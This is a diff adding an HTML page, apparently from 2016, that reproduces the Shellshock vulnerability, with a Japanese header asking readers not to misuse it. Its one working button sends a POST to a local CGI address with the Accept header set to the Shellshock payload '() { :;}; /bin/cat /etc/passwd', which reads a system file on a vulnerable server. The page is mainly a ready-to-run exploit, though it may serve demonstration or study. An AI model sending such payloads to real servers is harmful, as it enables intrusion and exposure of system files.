@@ -1,0 +1,37 @@
+<html>
+	<head>
+		<title>Shellshock用リクエスト</title>
+	</head>
+	<body>
+		<header>
+			<h1>Shellshock再現用のコードです．</h1>
+			<h3>決して悪用はしないでください．</h3>
+		</header>
+    <button type="button" id="Accept">Accept</button>
+    <button type="button" id="Accept-Encoding">Accept-Encoding</button>
+    <button type="button" id="Accept-Language">Accept-Language</button>
+    <button type="button" id="Cache-Control">Cache-Control</button>
+    <button type="button" id="Connection">Connection</button>
+    <button type="button" id="Host">Host</button>
+    <button type="button" id="User-Agent">User-Agent</button>
+    <button type="button" id="Origin">Origin</button>
+    <button type="button" id="Upgrade-Insecure-Requests">Upgrade-Insecure-Requests</button>
+    <hr>
+		<footer>
+			© 2016 Rio Hosoi
+		</footer>
+    <script type="text/javascript" src="js/jquery-3.1.0.min.js"></script>
+    <script type="text/javascript">
+    $('#Accept').click(function() {
+      var url = "//192.168.100.4/vlun.cgi";
+      $.ajax({
+        type: 'POST',
+        url: url,
+        headers: {
+          'Accept': '() { :;}; /bin/cat /etc/passwd'
+        }
+      });
+    });
+    </script>
+	</body>
+</html>
